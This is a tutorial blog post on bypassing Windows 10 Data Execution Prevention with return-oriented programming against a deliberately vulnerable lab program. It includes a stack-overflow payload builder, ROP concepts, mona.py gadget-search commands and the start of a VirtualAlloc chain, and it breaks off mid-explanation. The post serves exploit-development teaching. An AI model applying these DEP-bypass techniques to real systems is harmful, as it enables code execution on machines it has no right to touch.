---
layout: post
title:  "Modern Windows Exploitation Part 2: Bypassing Data Execution Prevention (DEP)"
author: Clarissa Podell
date:   2018-07-19
description: Article on bypassing data execution prevention in Windows 10
excerpt: Article on bypassing data execution prevention in Windows 10
comments: false
mathjax: false
toc: true
last_modified_at: 2017-03-09T13:01:27-05:00
categories:
   - windows
   - exploit
tags:
   - windows
   - exploit
   - windbg
   - msfvenom
   - rop
   - immunity debugger
---

<style>
table {
    /*width: auto;*/
    margin-bottom: 1rem;
}
tr, th {
    width: auto;
}
th, td {
    /*width: auto;*/
    padding: 5px 30px;
    text-align: left;
}
</style>

```     
          0x00000000      (low addresses)
       -----------------
RE =>  |  text (code)  |
       -----------------
RW =>  |     data      |
       -----------------
R  =>  |      bss      |
       -----------------
       |          |    |
RW =>  |   heap   |    |
       |          v    |
       -----------------
       |          ^    |
RW =>  |   stack  |    |
       |          |    |
       -----------------
          0xffffffff      (high addresses)
```

# Introduction

This is Part 2 of my Modern Windows Exploitation blog series on bypassing exploit mitigations.  

In the [previous post]({{ site.baseurl }}{% link _posts/2018-07-12-windows-bypass-1.md %}), I presented an exploit against sample program `vuln.exe` that bypasses ASLR and Stack Cookies (/GS).  This post will expand that exploit to bypass Data Execution Prevention (DEP) using the same sample program.  At this point, we rely on all default Windows 10 modern mitigations.  If you haven't already, I suggest at least skimming the content of [Part 1]({{ site.baseurl }}{% link _posts/2018-07-12-windows-bypass-1.md %}) since this post will extend that exploit to also bypass DEP.

First, re-compile `vuln.exe` with all mitigations enabled.  Since these are turned on by default, nothing needs to be passed explicitly to Visual Studio 2015's compiler or linker.

{% highlight shell %}
C:\> cl /Zi /Fevuln-dep.exe vuln.c
{% endhighlight %}

This creates the binary `vuln-dep.exe` with debugging information.

The first two stages of the exploit deal with leaking information to bypass ASLR and stack cookies and then controlling the target address of an indirect call instruction.  Here we introduce new actions that are necessary for completing this exploit.

# Data Execution Prevention (DEP)

Data Execution Prevention (DEP), also referred to as W^X in Linux, was introduced as an industry response to code injection attacks.  Exploits in this class of attacks inject data (like shellcode) into a process where it's stored in the heap or the stack until it is executed.

DEP is a memory protection feature that enables the system to mark pages of memory as non-executable.  The CPU enforces DEP by only executing instructions that have been explicitly marked as executable.  Before, it was only possible to set memory as read-only or read-write, but not as Executable or Non-Executable.

This helps prevent the execution of malicious code that has been introduced into the system by an attacker.  Specifically, it prevents any attempt to run code from protected data pages like the default heap or stack as code is not typically executed from these regions in normal operations of the system.  Execution of injected code in non-executable memory will cause a processor exception followed by the termination of the process.  

In Windows, DEP is implemented at the hardware and software levels.  Both types of DEP are enabled by default on Windows 10.

* Hardware-enforced DEP enables protection for both kernel-mode and user-mode processes. It requires support from the processor and operating system.  Windows makes use of a processor's **No eXecute** (NX) bit in AMD or the **eXecute Disable** (XD) bit in Intel to enforce non-executable pages.  The use of this bit in each page table entry (PTE) marks the associated memory page as non-executable.

<a href="{{ site.baseurl }}/images/pte.png" title="Zoom In">
<img class="img-center-sm" src="{{ site.baseurl }}/images/pte.png" alt="Page Table Entry">
</a>

* Software-enforced DEP enables protection only on user-mode processes. It performs additional security checks on exception handling mechanisms.  Like SafeSEH, it ensures that before an exception is dispatched, the exception handler is located within a memory region marked as executable.

The only pages with execute permissions are the `.text` segments for each module which contain the program's executable instructions (or code).  DEP marks all other memory locations non-executable.  In addition, all writable locations are marked non-executable (no region is allowed both write and execute permissions).

We can view a process' virtual address space protection using the "Memory Map" (ALT+M) in Immunity Debugger as shown below.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/rop-memory.png" alt="memory map">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/rop-memory.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

In WinDbg, we can display the same information but with more refined control over the output.  Below is the command to display the memory of executable sections in the process' image.

`0:000> !address -f:PAGE_EXECUTE_READ,Image`

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/dep_base_addresses_windbg.PNG" alt="memory map">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/dep_base_addresses_windbg.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

## DEP in Action (Triggering the Vulnerability)

In [Part 1]({{ site.baseurl }}{% link _posts/2018-07-12-windows-bypass-1.md %}) (Bypassing GS), we executed our shellcode by placing it on the stack and redirecting the instruction pointer to it.  DEP aims at preventing just that by ending the process before the shellcode gets executed.

Before getting into the fun stuff, let's see DEP in action by executing `gs_exploit.py` on our re-compiled `vuln-dep.exe` binary (see [Introduction]).

[Introduction]: #introduction

I modified the payload slightly to give a basic buffer structure that bypasses GS and overwrites EIP with the address of the stack pointer.

{% highlight python %}
def create_payload(eax, ret):

    buf  = "\x41" * 1024    # buf
    buf += pack('<I', eax)  # eax = XOR'ed GS cookie
    buf += "\x42" * 4       # overwrite ebp w/ random 4-byte value
    buf += pack('<I', ret)  # overwrite eip w/ ESP addr from memleak
    buf += "\x90" * 12      # nopsled / shellcode

    return buf
{% endhighlight %}

Now, run the exploit against the new `vuln-dep.exe` target. WinDbg automatically kicks in when the application crashes.  You can see the resulting crash in the screenshot below.

When the program attempts to execute code from a DEP protected data page, the processor will trigger an exception with the status code "`Access violation - code c0000005`" resulting in process termination.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/windbg-dep.PNG" alt="WinDbg DEP crash">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/windbg-dep.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

With DEP enabled, not even a *single* instruction will be executed from the stack without bypassing or disabling DEP first.

The program crashes right when it tries to execute the first instruction of the NOP sled (so when EIP gets redirected to the stack at address `0x006ffbfc`).   We still control EIP and the content on the stack when the overflow happens, we just can't execute it since page permissions forbid it.

{% highlight x86asm %}
(18f24.18f20): Access violation - code c0000005 (!!! second chance !!!)
eax=00000418 ebx=004b4000 ecx=1f0e4674 edx=00000000 esi=0088fe24 edi=0088fe28
eip=006ffbfc esp=006ffbfc ebp=42424242 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
006ffbfc 90              nop
{% endhighlight %}

{% comment %}
You can see that the system raised an access violation attempting to execute code from a non-executable (PAGE_READWRITE) address. DEP saves the day!

We can take a closer look at the contents of an exception record using `.exr [address]` (-1 displays the most recent exception).  `Parameter[0]: 00000008` indicates the type of access violation was an execution violation, and `Parameter[1]: 006ffbfc` is the address that caused the violation.  This is the standard output for a DEP exception record.

{% highlight x86asm %}
0:000> .exr -1
ExceptionAddress: 006ffbfc
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000008
   Parameter[1]: 006ffbfc
Attempt to execute non-executable address 006ffbfc
{% endhighlight %}

Another way to analyze the crash is with [!exploitable](https://archive.codeplex.com/?p=msecdbg), a WinDbg extension that determines the exploitability of a crash.  It's typically used as a triaging tool for prioritizing bugs during fuzzing, but it can be useful in a variety of situations.

Use `.load msec` to load the extension then `!exploitable` after the crash to automatically generate a crash classification.

{% highlight bash %}
0:000> .load msec
0:000> !exploitable

!exploitable 1.6.0.0
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Data Execution Prevention Violation starting at Unknown Symbol @ 0xffffffff90909090 called from KERNEL32!BaseThreadInitThunk+0x0000000000000024 (Hash=0x751148a3.0x9023ec76)

User mode DEP access violations are exploitable.
{% endhighlight %}

Either way, both manual and automated investigation confirms the crash was caused by a DEP violation.
{% endcomment %}

## Checking DEP Protection

The Windows DEP policy is managed on both a system wide and per-process basis.  I'll show how to check both here.

### On a Process

One option to check the DEP status of a process is to use Microsoft Sysinternals [Process Explorer].  This displays a list of the currently active processes and a column that shows the DEP protection status.  This must be configured by going to View -> Select Columns -> Process Image tab -> DEP Status.

[Process Explorer]: https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/procexp-dep.png" alt="Process Explorer">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/procexp-dep.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

Another option is to use [DUMPBIN.EXE], Microsoft's COFF/PE Binary File Dumper, from one of the Visual Studio command prompts.  The `/NXCOMPAT` compile flag in the executable's header determines whether or not a program is protected by DEP.  Use dumpbin with the `/HEADERS` option to display this information.

[DUMPBIN.EXE]: https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-reference

{% highlight shell %}
C:\> dumpbin.exe /HEADERS vuln-dep.exe
{% endhighlight %}

The `DLL characteristics` field under `OPTIONAL HEADER` specifies the security attributes of the process.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/dumpbin.png" alt="dumpbin">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/dumpbin.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

{% comment %}
My last suggestion is a WinDbg extension called [narly](https://github.com/d0c-s4vage/narly) by Nephi Johnson (d0c_s4vage).  This extension lists the /SafeSEH, /GS, DEP, and ASLR status of all loaded modules.

First, load the extension into WinDbg:

`0:018> .load narly`

Then use `!nmod` to run the module.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/narly.PNG" alt="WinDBG Narly">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/narly.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>
{% endcomment %}

### On the System

To check if your CPU supports the NX/XD bit (i.e. hardware-enforced DEP), follow these steps on Windows OS: Control Panel -> System and Security -> System -> Advanced system settings -> Performance -> Settings -> Data Execution Prevention tab.  Below displays the default settings on Windows 10 along with confirmation of hardware-enforced DEP support.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/depsettings.png" alt="DEP settings">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/depsettings.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

{% comment %}
There's also plenty of third-party software that will display the details of your computer's hardware.  One of the programs I already have installed on my laptop is [HWiNFO](https://www.hwinfo.com/), a hardware analysis, monitoring and reporting tool for Windows.  My processor version is AMD A12-9700P, so my CPU supports the NX ("No eXecute") bit.  

Below displays a summary of my laptop's hardware including a list of the supported CPU features.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/nxbit.png" alt="DEP settings">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/nxbit.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>
{% endcomment %}

The system settings for hardware DEP is determined in the boot configuration.
We can also examine the hardware DEP settings in Windows with the `Wmic` command-line tool.

```
C:\> wmic OS Get DataExecutionPrevention_Available
DataExecutionPrevention_Available
TRUE
```

TRUE means that hardware-enforced DEP is available.

The `DataExecutionPrevention_Drivers` property of the Win32_OperatingSystem class also verifies that Windows is running with hardware DEP enabled.  In some system configurations, hardware DEP may be disabled by using the /nopae or /execute switches in the Boot.ini file. To examine this property, use the following command:

```
C:\> wmic OS Get DataExecutionPrevention_Drivers
DataExecutionPrevention_Drivers
TRUE
```

# Return-Oriented Programming (ROP) Attack

Since DEP prevents directly returning into shellcode (as we did previously), it will require more effort and creativity to go from gaining control of EIP to arbitrary code execution.

Return-Oriented Programming (ROP), a type of code-reuse attack, was introduced to evade DEP protections in response to its widespread deployment in CPU's and operating systems.  ROP has become the exploitation technique of choice for modern memory corruption vulnerabilities and has been shown to break most existing defenses.  The [original paper][5] introducing ROP was published in 2007 by Shacham.

DEP and other code injection defenses make the assumption that preventing the introduction of malicious code is enough to prevent the execution of malicious arbitrary instructions.  ROP challenges this assumption and disproves it.

With return-oriented programming, we can induce arbitrary computation without injecting any new code.  Return-oriented exploits reuse existing code fragments (called "gadgets") already present in the process image, so it's not affected by code injection defenses like DEP.  Using this technique, an attacker can perform malicious (or otherwise unintended) computations by combining various instruction sequences from the program's executable memory.  Thus, this attack succeeds without ever running code from non-executable memory.

{% comment %}
We call our  approach Call-Oriented Programming (COP). Instead of using gadgets that end in returns, we use gadgets that end with indirect calls.   This  may  at  first  seem  trivially  similar  to  jump-oriented programming, but there is one important distinction:  indirect calls are usually memory-indirect (the location  to  which  control  is  transferred  is  determined  by a value in memory,  not directly by the value of a register).  As a result, COP attacks do not require a dispatcher gadget.  In a COP attack, gadgets are chained together by pointing the memory-indirect locations to the next gadget in sequence.

the building blocks for our attack are short code sequences, each just two or three instructions  long.
discovered short instruction sequences; we then showed how to combine such sequences into gadgets that allow an attacker to perform arbitrary computation.  an attacker can combine such sequences to perform arbitrary computation.
{% endcomment %}

## Return-Oriented Gadgets

The gadget is "the organizational unit of a return-oriented attack" [[3]][3].  The term gadget refers to a short code sequence ending with a RETN instruction.  Gadgets are short, just 2 or 3 instructions long, and perform only a small amount of work.  

Each gadget is an address on the stack pointing to a code sequence in the exploited program's memory that accomplishes some well-defined arbitrary task.  This task may be a load/store operation, an xor (arithmetic), or a jump (control-flow).  Chaining these sequences together allow us to execute higher-level actions such as changing the register status or executing a system call.

We'll need to find instruction sequences followed by a RETN in the program's executable code (`.text`) section.  A program often loads multiple executable code segments into memory i.e. application modules, linked libraries, OS modules, etc.  The following example constructs a gadget from three random instruction sequences found in a program's executable memory.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/rop-gadget.png" alt="Gadget Example">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/rop-gadget.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

Below illustrates how an attacker can combine such sequences to perform arbitrary computation.  This example moves a value from EAX into EBX.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/rop-gadget-chain.png" alt="Gadget Chain Example">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/rop-gadget-chain.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

A return-oriented program will fill the stack with data and the addresses of gadgets.  Data that is placed in between pointers will get picked up by one of the instructions (i.e. values on the stack are popped into the registers).  The stack representation of the above example looks something like this:

<a href="{{ site.baseurl }}/images/rop-pointers.png" title="Zoom In">
      <img class="img-center" src="{{ site.baseurl }}/images/rop-pointers.png" alt="Gadget Chain Example">
</a>


## Gadget Chaining

The gadgets are set up in a certain way to form a "chain" where one gadget returns to the next gadget without ever executing code directly from the stack.  Gadget chaining is achieved by ending each instruction sequence with a RETN instruction.

In return-oriented programming, the RETN at the end of each gadget takes care of advancing the stack pointer and fetching the next instruction to be executed in the following way:

When the processor executes a RETN instruction, ESP points to the next gadget on the stack to be executed.  This address is then popped off the stack into the register EIP and ESP is incremented by 4 bytes to point to the next address on the stack.  These conditions guarantee that the return-oriented program will execute one gadget after another.

Execution of a RETN in this context is similar to a NOP (no-operation) instruction.  When the processor executes a NOP, it advances EIP to the next instruction without actually executing any code.  This is basically what RETN does.  This is also referred to as ROP's version of NOP or a "ROP NOP".

# Bypassing DEP on Windows

Microsoft provides a mechanism through its application programming interface (API) for disabling DEP from within a user-mode process.  We'll leverage this feature to disable DEP programmatically.  The API can be called during process execution to change the memory permissions on an arbitrary range of pages.  This leaves an attacker free to execute code from previously non-executable regions.

Our goal is to find a way to make our shellcode executable again.  So, we'll build a ROP-chain to call one of the API functions for the current process we are executing in and change the execution flags of the stack to make it executable.  Then, we are free to transfer control back to our shellcode stored on the stack and execute it as normal.

{% comment %}
Since DEP prevents the execution of our own code on the stack, we need to find a way to make our shellcode executable again.  
It follows that the attacker would be able to execute code from previously non-executable memory regions leaving us free to return/call our shellcode.
As an attacker, we can return to these functions and make the stack executable. Then we are free to return/call our shellcode and it will execute freely.
This in turn marks the stack that contains the shellcode as executable and allows us to transfer control back to our shellcode stored on the stack to be executed.
{% endcomment %}

## Windows API Functions to Bypass DEP

There are a few functions in the Windows API that allow us to change protection flags of memory mappings.  We can use these functions to disable/bypass a program's DEP settings as explained previously.  

The first step of constructing a ROP-based exploit is researching all the available options and determining which one to work with.  Some of these include:

* `VirtualAlloc(MEM_COMMIT + PAGE_EXECUTE_READWRITE)` allows the creation of a new executable memory region in the virtual address space of the calling process to which shellcode can be copied to and executed.
* `VirtualProtect(PAGE_EXECUTE_READWRITE)` changes the permissions on a region of specified pages in the virtual address space of the calling process, making the stack containing the shellcode executable again.
* `SetProcessDEPPolicy(dwFlags=0)` changes the data execution prevention (DEP) settings for a 32-bit process.  This function overrides the system DEP policy for the current process.
* `SetInformationProcess(MEM_EXECUTE_OPTION_ENABLE)` will change the DEP policy for the current process and permit execution of code from non-executable memory regions.
* `WriteProcessMemory()` writes data (such as shellcode) to an area of existing executable memory by modifying the protection type of the existing memory pages to be writeable.  The target location must be writable and executable.

[Click here] for a complete list of the memory management functions in Windows API.

[Click here]: https://docs.microsoft.com/en-us/windows/desktop/memory/memory-management-functions

We can invoke an arbitrary function call with arbitrary arguments by carefully arranging values on the stack.  Each of the above functions require a specific memory layout of the stack.  The parameters to that API are passed to a function in registers.  We'll use gadgets to craft each of the function parameters later.

The function call must be immediately followed by the necessary parameters to ensure the function executes as intended.  Our ROP-Chain will set up the stack/register memory layout, so that when the API function is called, the top of the stack (ESP) points at the necessary function parameters.  

As an example, here's the stack layout of a 3-argument API function at the time of the function call:

{% highlight shell %}
EIP --> &function
ESP --> parameter 1
        parameter 2
        parameter 3
        ...
        nops
        shellcode
{% endhighlight %}

## From EIP to ROP

The [GS exploit][previous post] from my previous post provides the perfect base to build a ROP exploit.  The initial process to trigger the buffer overflow, overwrite the stack cookie to bypass GS, and gain control of the Instruction Pointer will remain the same.  We'll use the stack-based buffer overflow to place gadgets on the overflowed stack and use control of the stack to direct execution into existing code sequences.

In the last post, I showed that our buffer is located in the ESP register at the time of the program crash, so we can overwrite the saved return address with a simple RETN to get to our ROP-Chain.  Overwriting EIP with a pointer to RETN will kick-start the chain.  Each time the program executes a "RET" instruction it will return to the stack (i.e. RET will return to the caller) and pick up the next address from the stack and jump to it.

We can find a pointer that points to RET in one of the loaded executable modules.  This address will be used in the exploit buffer to overwrite EIP.  But, more on this later.

{% comment %}
We use control of EIP to point ESP to attacker-controlled data “Stack Pivot”
We use control of the stack to direct execution by simulating subroutine returns into existing code
Reuse existing subroutines and instruction sequences until we can transition to full arbitrary code execution
{% endcomment %}

# mona.py plugin for Immunity Debugger

In the remainder of this post, I'll talk about `mona.py`, a PyCommand plug-in for Immunity Debugger by Peter Van Eeckhoutte (the [Corelan Team](https://www.corelan.be/)).  It comes with 50+ commands and features to assist with exploit development and vulnerability research.  One of the most powerful features I'll highlight is mona's ROP-gadget search engine.

This is one of the most comprehensive (and free!) tools I've come across on Windows.  The authors also ported `mona` over to WinDbg.  In my opinion, it's much slower than compared to Immunity.  But this may not be true for everyone.

For more information, you can read the manual [here][1] or install it from the mona project page [here][4].

##### Basic usage

Like all PyCommands in Immunity, `mona` can only be accessed while in the debugging environment.  There's a command bar at the bottom of the application for input.  To list the available commands and options, enter one of the following into the input box:

{% highlight bash %}
!mona
!mona help
{% endhighlight %}

To print additional information for each command:

```shell
!mona help [command]
```  

Before using mona for the first time, it should be configured properly to write output to a working application folder.  This will tell mona to write the output to subfolders of `c:\logs`.  

```shell
!mona config -set workingfolder c:\logs\%p
```

The `%p` will be replaced with the process name.  So, if we are debugging `vuln.exe`, the output will be saved to the subfolder `C:\logs\vuln`.  These folders will come in handy later when working with mona's ROP command.

## ROP Automation with mona.py

In this exploit, I take advantage of the ROP-gadget generator from [mona.py][1] to help with some of the heavy lifting.  Mona's `rop` command will generate a database of ROP gadgets and attempt to produce complete ROP chains using pointers from loaded modules we specify in the command.  Mona makes a laborous task super convenient by automating the process of enumerating sequences of executable bytes into usable instructions.

I let mona.py run against the three libraries without rebasing or ASLR in order to dump any applicable ROP gadgets and see if it could formulate and semblance of a ROP chain to disable DEP. I was actually a little surprised to see that mona had managed to piece together a workable chain or two to VirtualProtect() on it's own. Wow, perfect.

I guess this goes to show how important it is to have the right set of tools, and how much time it can save you.

The ROP chain sets up a call to VirtualProtect(), marking the stack as RWX (Read/Write/Execute) and then returning to a jmp esp instruction, droping our flow of execution onto the stack. At this point ASLR is bypassed, and DEP is disabled, so we've basically won.

I used the below command to generate this exploit.  I specify the global option `-m [module]` to have Mona generate ROP-Gadgets from three OS modules (more on this later) and the optional argument `-rva` to output addresses in the format `module_base_address + rva` instead of using hardcoded absolute addresses.

```
!mona rop -rva -m "kernel32,kernelbase,ntdll"
```

The command produces four output files:

- `rop.txt`: A list of all the ROP-Gadgets found.
- `rop_suggestions.txt`: A filtered list of suggested rop gadgets categorized based on function.
- `stackpivot.txt`: A list of gadgets that pivot ESP.
- `rop_chains.txt`:  Mona's ROP-chain automation feature.  Produces four entire rop chains based on VirtualProtect, VirtualAlloc, NtSetInformationProcess and SetProcessDEPPolicy.  Although these chains may work out of the box, this won't be the focus of my post.


{% comment %}
*note : this chain may not work out of the box you may have to change order or fix some gadgets, but it should give you a head start*
{-------------------------------------------------------------------------------------------------------------}
We construct a ROP chain to call `VirtualAlloc()` with the appropriate arguments to make the stack executable again.  Our shellcode will be copied from the stack in non-executable memory into the VirtualAlloc'ed page and ran.  No additional code is required as our current exploit provides the means to place our shellcode in the overwritten area of `buf` and has bypasses for previous mitigations.

To pass the appropriate arguments to VirtualAlloc() as described earlier, we reuse existing code segments called gadgets – short instruction sequences ending with an indirect control instruction such as ret –  to set program registers with the necessary values.

To generate our ROP chain, we ran Mona to search through all loaded modules using the command `!mona rop -m *` on the Immunity Debugger command line.
{-------------------------------------------------------------------------------------------------------------}
{% endcomment %}

### RVA / ASLR

Difficulty  of  relocating  critical  DLLs. Security-critical  DLLs  such  as ntdll and kernel32 are mapped to a fixed memory location by Windows very early in the boot process.
Relative address attacks don’t rely on absolute locations of data.

Since this module is shared by every application, its position only changes when Windows is rebooted.  Until we reboot Windows, we can pretend there is no ASLR.

A gadget is just an address that points to a sequence of instructions.  ROP-Chain's are constructed of a list of known addresses.  This technique relies on our ability to predict where certain instructions will be located within a certain module.  This can be challenging with ASLR enabled.

While working on this exploit, I noticed that the code locations of our modules are predictable across different program invocations (at least until the modules rebase at the next system reboot).  This is particularly strange behavior because our binary `vuln.exe` and all of its dependencies opt in to ASLR enforcement (see "[Checking DEP Protection](#checking-dep-protection)"). This means there should be no predictable code locations in any of our loaded modules.

In Windows 10, the default system setting is Bottom-Up ASLR (Windows Defender Security Center -> App & browser control -> Exploit protection settings).  This randomizes virtual memory allocations for heaps, stacks, TEBs, and PEBs (each of which can be confirmed in a debugger).  But, there's no mention of randomizing the base address of DLLs or EXEs.

I'll test this theory by running a simple address resolution program by steve hanna called [arwin.c](www.vividmachines.com/shellcode/arwin.c).  This program finds the absolute address of a function in a specified DLL using `LoadLibrary()` and `GetProcAddress()`.  I compiled the source code with `cl.exe` on one of the MSVC15 command prompts.

{% highlight console %}
C:\> cl.exe arwin.c
Microsoft (R) C/C++ Optimizing Compiler Version 19.00.24215.1 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

arwin.c
Microsoft (R) Incremental Linker Version 14.00.24215.1
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:arwin.exe
arwin.obj
C:\> arwin.exe
arwin - win32 address resolution program - by steve hanna - v.01
arwin.exe <Library Name> <Function Name>
{% endhighlight %}

This test demonstrates that the function VirtualAlloc is located at the same address in kernelbase across different invocations (see below).

<pre><code class="bash">C:\> arwin kernelbase VirtualAlloc
arwin - win32 address resolution program - by steve hanna - v.01
VirtualAlloc is located at <b style="color:#61aeee">0x772b4570</b> in kernelbase

C:\> arwin kernelbase VirtualAlloc
arwin - win32 address resolution program - by steve hanna - v.01
VirtualAlloc is located at <b style="color:#61aeee">0x772b4570</b> in kernelbase

C:\> arwin kernelbase VirtualAlloc
arwin - win32 address resolution program - by steve hanna - v.01
VirtualAlloc is located at <b style="color:#61aeee">0x772b4570</b> in kernelbase

C:\> arwin kernelbase VirtualAlloc
arwin - win32 address resolution program - by steve hanna - v.01
VirtualAlloc is located at <b style="color:#61aeee">0x772b4570</b> in kernelbase
</code></pre>

Despite Process Explorer's report that `arwin.exe` is using ASLR, the behavior in the above output indicates that the process has not been loaded at a randomized address.  

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/aslr.png" alt="ASLR">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/aslr.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

It appears that program modules load at a non-randomized address even with the default exploit mitigation settings of a patched Windows 10 OS.  We'll use this to our benefit and build a ROP-chain with fixed offsets.  This offset is the Relative Virtual Address (RVA) of each gadget.  The RVA is the memory offset from the beginning of the executable.  Adding the RVA to the Base Address gives the Absolute Memory Address.

A virtual address is not as predictable as an RVA, because the loader might not load the image at its preferred location (i.e. RVA is an
address within a section before relocation is applied during linking.)
The RVA is the address relative to the base address of the image.

Regarding RVA, it's simply designed to ease relocation. When loading relocable modules (eg, DLL) the system will try to slide it through process memory space. So in file layout it puts a "relative" address to help calculation.

Virtual Addreess (VA) is relative to Physical Address, per process (managed by OS)
RVA is relative to VA (file base or section base), per file (managed by linker and loader)

`Virtual Address = Base Address + Relative Virtual Address (RVA)`

Each time the module rebases (at reboot) the only thing we have to update is a variable that stores the base address.  This is much easier than updating the address of each indivdual gadget in the chain and makes the exploit easier to maintain between system reboots.

In our exploit code, we'll create variables to store these addresses:

{% highlight python %}
# base address of loaded modules
ntdll      = 0x77820000
kernel32   = 0x76db0000
kernelbase = 0x771e0000
{% endhighlight %}

I found that OS modules rebase less often than the application module (which rebases at recompilation in addition to reboot), so I decided to only use gadgets from OS dll's to make the exploit more stable and reliable (meaning it doesn't need to be updated as frequently).

The process to find a module's base address is very simple.  Here are two ways to obtain these addresses in each debugger.

In Immunity Debugger, the "Executable modules" window (ALT+E) lists each loaded module along with its base address, size, and other details.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/immdbg-module.PNG" alt="Mona Ropfunc">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/immdbg-module.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

In WinDbg, use `lm` to list the loaded modules and base addresses:

{% highlight x86asm %}
0:000> lm
start    end        module name
00820000 00897000   vuln         C (private pdb symbols)  C:\blog\part2\vuln.pdb         
76db0000 76e90000   KERNEL32       (deferred)             
771e0000 773c4000   KERNELBASE     (deferred)             
77820000 779b0000   ntdll          (pdb symbols)
{% endhighlight %}

{% comment %}
While working on this exploit, I discovered that the OS dll's only rebase once at system boot.  Even with ASLR fully enforced, the base addresses to our OS modules (namely ntdll.dll, kernel32.dll and kernelbase.dll) remain the same throughout different program invocations.  In addition, the base address to the application module `vuln.exe` rebases on system reboot and recompilation.  
I discovered that the OS dll's only rebase once at system boot, so addresses remain the same until the next reboot.

I'll run [arwin.c](www.vividmachines.com/shellcode/arwin.c), a program by Steve Hanna, multiple times to demonstrate the absolute address of a function in a specified DLL.  This shows that VirtualAlloc is located at the same address across different invocations (see below).  

This means the operating system does not vary the load address between each program invocation.  This proves we can reliably use addresses from OS DLL's in our ROP-Chain.  
But notice that the base address for vlc.exe is 0x00400000, which is a special address in the world of Microsoft Windows.
So, what does this mean for our exploit? This means in the exploit, we can build a ROP chain with fixed offsets.
I decided to investigate this "lapse" in ASLR protection to find out if it's intentional or a flaw.  In Windows 10, the default system setting is Bottom-Up ASLR.  These settings can be viewed or configured by going to Windows Defender Security Center -> App & browser control -> Exploit protection settings.
<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/exploit-settings.PNG" alt="Windows Defender Security Center">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/exploit-settings.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>
Bottom-Up ASLR randomizes virtual memory allocations for heaps, stacks, TEBs, and PEBs.  But, there's no mention of randomizing the base addresses of DLLs or EXEs.
Rather than loading DLLs and EXEs at constant base addresses, the operating system does not vary the load address (at least across reboots, not necessarily between every invocation of a program).

Windows stack addresses are usually not predictable
Executable and library addresses are predictable
System libraries are often static between patch levels
Application libraries change even less frequently
Executable addresses only change between app versions

It's important to mention that I built the ROP chain using each gadget's Relative Virtual Address (RVA) instead of using its absolute address directly.  The RVA is the memory offset from the beginning of the executable.  Adding the RVA to the Base Address gives the Absolute Memory Address.

To convert the RVA into the Virtual Address(VA), the base address is added to the RVA (RVA+Base).  
{% endcomment %}

# Building our ROP Payload

The first stage uses RoP to call a Windows

Our final exploit will be implemented in two stages:

- "**First-stage**" payload contains the ROP-Chain to call a Windows API function and mark the memory region (that stores the shellcode) as executable, effectively bypassing DEP.
- "**Second-stage**" payload contains the regular "traditional" shellcode.

## VirtualAlloc ROP-Chain

In this post, I'll build a `VirtualAlloc`-based return oriented exploit to allocate executable memory where the shellcode is located, so it can get executed.  According to [MSDN][2], VirtualAlloc:

> Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process.  

The following prototype illustrates a call to disable DEP for the current process:

{% highlight python %}
LPVOID WINAPI VirtualAlloc(           => pointer to &VirtualAlloc
    _In_opt_ LPVOID lpAddress,        => address of stack pointer (ESP)
    _In_     SIZE_T dwSize,           => 0x1
    _In_     DWORD  flAllocationType, => 0x1000 (MEM_COMMIT)
    _In_     DWORD  flProtect         => 0x40 (PAGE_EXECUTE_READWRITE)
);
{% endhighlight %}

Here's a brief description of each of these parameters.

- **lpAddress**, starting address of the region to allocate.
